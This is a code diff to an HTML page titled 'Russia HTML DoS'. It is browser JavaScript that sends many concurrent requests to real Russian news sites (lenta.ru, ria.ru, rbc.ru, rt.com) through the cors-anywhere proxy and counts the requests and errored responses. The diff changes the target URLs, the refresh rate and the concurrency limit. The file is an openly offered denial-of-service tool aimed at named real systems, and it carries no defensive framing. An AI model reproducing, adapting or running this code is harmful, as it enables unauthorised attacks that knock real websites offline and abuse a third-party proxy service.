@@ -1,5 +1,5 @@
 <html>
-    <head><meta http-equiv="Content-Security-Policy" content="*">
+    <head>
   <title>Russia HTML DoS</title>
 </head>
 <body>
@@ -114,8 +114,8 @@
 
 <script>
 var targets = {
-  'https://cors-anywhere.herokuapp.com/https://cors-anywhere.herokuapp.com/https://cors-anywhere.herokuapp.com/https://lenta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
-  'https://cors-anywhere.herokuapp.com/https://cors-anywhere.herokuapp.com/https://cors-anywhere.herokuapp.com/https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://cors-anywhere.herokuapp.com/https://lenta.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
+  'https://cors-anywhere.herokuapp.com//https://ria.ru': { number_of_requests: 0, number_of_errored_responses: 0 },
   'https://cors-anywhere.herokuapp.com/https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
   'https://cors-anywhere.herokuapp.com/https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
   'https://cors-anywhere.herokuapp.com/https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -138,9 +138,9 @@ var statsEl = document.getElementById('stats');
 function printStats() {
   statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
 }
-setInterval(printStats, 1000);
+setInterval(printStats, 100);
 
-var CONCURRENCY_LIMIT = 1000
+var CONCURRENCY_LIMIT = 200
 var queue = []
 
 async function fetchWithTimeout(resource, options) {
